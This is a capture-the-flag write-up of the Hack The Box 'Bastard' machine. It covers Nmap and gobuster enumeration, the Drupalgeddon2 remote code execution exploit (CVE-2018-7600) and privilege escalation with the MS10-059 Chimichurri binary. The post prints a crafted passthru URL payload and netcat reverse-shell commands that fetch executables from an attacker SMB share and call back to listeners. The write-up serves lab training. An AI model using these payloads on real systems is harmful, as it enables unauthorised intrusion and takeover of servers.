---
title: "Bastard"
date: 2023-07-21T17:19:10+02:00
tags: ["windows","web","privesc"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Windows machine with a webpage powered by Drupal which was our first entry point thanks to CVE-2018-7600 which gives use RCE. For privesc I exploited the MS10-059 which is a unpatched kernel vulnerability."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---
## Room Information

- Room name: Bastard
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/Bastard

![Untitled](/HTB/bastard-icon.png)

## Tools Used

- Nmap
- Github
- windows-exploit-suggester

## Port Scanning

```powershell
PORT      STATE SERVICE REASON          VERSION
80/tcp    open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Bastard | Bastard
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-server-header: Microsoft-IIS/7.5
| http-robots.txt: 36 disallowed entries
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We have a http server at **port 80** which is a website powered by drupal 7 and two msrpc ports at **135** and **49154.**

## Enumeration

The only thing we can enumerate is the website, so let’s start with a quick search of any exploit for Drupal 7.

Drupal is a free and open-source web content management system written in PHP and distributed under the GNU General Public License.

![Untitled](/HTB/bastard-1.png)

Searching on Google, I found one github repo https://github.com/dreadlocked/Drupalgeddon2 which take advantage of the **CVE-2018-7600** to get a RCE.

Let’s enumerate other stuff, if we take a look of the website the home page is a login page

![Untitled](/HTB/bastard-2.png)

As always I put the common/default credentials, but nothing seems to work.

So I started a quick fuzz for see other way to exploit this machine.

```powershell
===============================================================
2023/07/20 21:33:08 Starting gobuster in directory enumeration mode
===============================================================
/.cvsignore/          (Status: 403) [Size: 1233]
/.cvs/                (Status: 403) [Size: 1233]
/.git/HEAD/           (Status: 403) [Size: 1233]
/.hta/                (Status: 403) [Size: 1233]
/.bash_history/       (Status: 403) [Size: 1233]
/.cache/              (Status: 403) [Size: 1233]
/.bashrc/             (Status: 403) [Size: 1233]
/.forward/            (Status: 403) [Size: 1233]
/.htaccess/           (Status: 403) [Size: 1233]
/.history/            (Status: 403) [Size: 1233]
/.config/             (Status: 403) [Size: 1233]
/.htpasswd/           (Status: 403) [Size: 1233]
/.listing/            (Status: 403) [Size: 1233]
/.listings/           (Status: 403) [Size: 1233]
/.passwd/             (Status: 403) [Size: 1233]
/.profile/            (Status: 403) [Size: 1233]
/.rhosts/             (Status: 403) [Size: 1233]
/.sh_history/         (Status: 403) [Size: 1233]
/.ssh/                (Status: 403) [Size: 1233]
/.mysql_history/      (Status: 403) [Size: 1233]
/.perf/               (Status: 403) [Size: 1233]
/.subversion/         (Status: 403) [Size: 1233]
/.svn/entries/        (Status: 403) [Size: 1233]
/.swf/                (Status: 403) [Size: 1233]
/.web/                (Status: 403) [Size: 1233]
/.svn/                (Status: 403) [Size: 1233]
/0/                   (Status: 200) [Size: 7571]
/admin/               (Status: 403) [Size: 1233]
/Admin/               (Status: 403) [Size: 1233]
/ADMIN/               (Status: 403) [Size: 1233]
/batch/               (Status: 403) [Size: 1233]
/entries/             (Status: 403) [Size: 1233]
/Entries/             (Status: 403) [Size: 1233]
/includes/            (Status: 403) [Size: 1233]
/misc/                (Status: 403) [Size: 1233]
/Misc/                (Status: 403) [Size: 1233]
/modules/             (Status: 403) [Size: 1233]
/node/                (Status: 200) [Size: 7571]
/profiles/            (Status: 403) [Size: 1233]
/rest/                (Status: 200) [Size: 62]
/scripts/             (Status: 403) [Size: 1233]
/Scripts/             (Status: 403) [Size: 1233]
/search/              (Status: 403) [Size: 1233]
/Search/              (Status: 403) [Size: 1233]
/sites/               (Status: 403) [Size: 1233]
/Sites/               (Status: 403) [Size: 1233]
/themes/              (Status: 403) [Size: 1233]
/Themes/              (Status: 403) [Size: 1233]
/user/                (Status: 200) [Size: 7414]
/xmlrpc.php/          (Status: 200) [Size: 42]

===============================================================
2023/07/20 22:23:29 Finished
===============================================================
```

But only we have a bunch of modules and nothing interesting.

## Exploiting

Reading the exploit docs, we realized that the exploit runs with the following command.

```ruby
ruby drupalggedon2.rb $IP --verbose
```

This exploits gives us a RCE thanks to a crafted url with the payload which we are going to execute.

```bash
http://10.10.10.9/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]={payload}
```

I put a smbserver.py on the nc.exe directory in orde to execute the next payload to have a reverse shell.

```powershell
\\10.10.14.20\smbFolder\nc.exe -e cmd 10.10.14.20 4444
```

```powershell
nc -lv 4444
```

## Gaining an Initial Foothold

![Untitled](/HTB/bastard-3.png)

We are nt authority\iusr

Let’s try to acces to the user’s directory in order to cat the **user’s flag**.

![Untitled](/HTB/bastard-4.png)

## Escalating Privilege

Let’s see what version of windows is running this machine. The output of the `systeminfo` command shows the OS name and version.

```powershell
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          21/7/2023, 4:49:40 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
                           [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.583 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.606 MB
Virtual Memory: In Use:    489 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
```

We are managing a Microsoft Windows Server 2008 R2 Datacenter 6.1.7600 with no Hostfix(s). Let’s see with the help of [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) if exists any unpatched kernel vulnerability.

I saved the `systeminfo` output to a txt file to pass the file to my computer to run the windows-exploit-suggester without problems.

First we need to update the database with

```python
python2 ./windows-exploit-suggester.py -u
```

Then we need to pass the following arguments to run it.

```python
python2 ./windows-exploit-suggester.py --database database.xls --systeminfo systeminfo.txt
```

```bash
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*]
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
```

The scan results show three non-metasploit vulnerabilities.

I googled the MS11-011 exploit but seems a Windows XP exploit, so I tried the MS10-059.

![Untitled](/HTB/bastard-5.png)

### MS10-059

I found a github repo [Chimichurri.exe](https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe) with a compiled binary of the MS10-059 exploit.

Only rests, send the exploit (I send it with [smbserver.py](http://smbserver.py) in the file directory).

In order to send the file without problems, I created a directory on `C:\Windows\Temp` called PrivEsc.

```powershell
cd C:\Windows\Temp
mkdir PrivEsc
cd PrivEsc
copy \\10.10.14.20\smbFolder\Chimichurri.exe .
```

Once send it, let’s run it and set a nc listener and see the magic happens.

```powershell
.\Chimichurri.exe 10.10.14.20 4445
```

```bash
nc -lv 4445
```

![Untitled](/HTB/bastard-6.png)

Other machine down

![Untitled](/HTB/bastard-7.png)

**Thank you for reading, and happy hacking! 😄**